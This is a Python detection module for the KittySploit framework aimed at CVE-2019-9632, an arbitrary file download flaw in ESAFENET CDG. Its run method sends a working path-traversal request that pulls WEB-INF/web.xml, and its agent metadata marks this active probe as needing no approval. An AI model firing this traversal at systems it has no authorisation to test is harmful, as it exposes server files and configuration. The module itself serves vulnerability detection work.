#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ESAFENET CDG V3 and V5 has an arbitrary file download vulnerability via the fileName parameter in download."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'ESAFENET CDG - Arbitrary File Download Detection',
        'description': 'ESAFENET CDG V3 and V5 has an arbitrary file download vulnerability via the fileName parameter in download.jsp because the InstallationPack parameter is mishandled in a /CDGServer3/ClientAjax request.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'esafenet', 'lfi', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://github.com/HimmelAward/Goby_POC', 'https://github.com/Z0fhack/Goby_POC'],
        'cve': 'CVE-2019-9632',
    }

    def run(self):
        path = '/CDGServer3/ClientAjax'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='command=downclientpak&InstallationPack=../WEB-INF/web.xml&forward=index.jsp\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('<servlet-name>CDGPermissions</servlet-name>',)
        if any(m in body for m in body_any):
            self.set_info(
                severity='high',
                reason='ESAFENET CDG - Arbitrary File Download detected',
                path=path,
            )
            return True
        return False

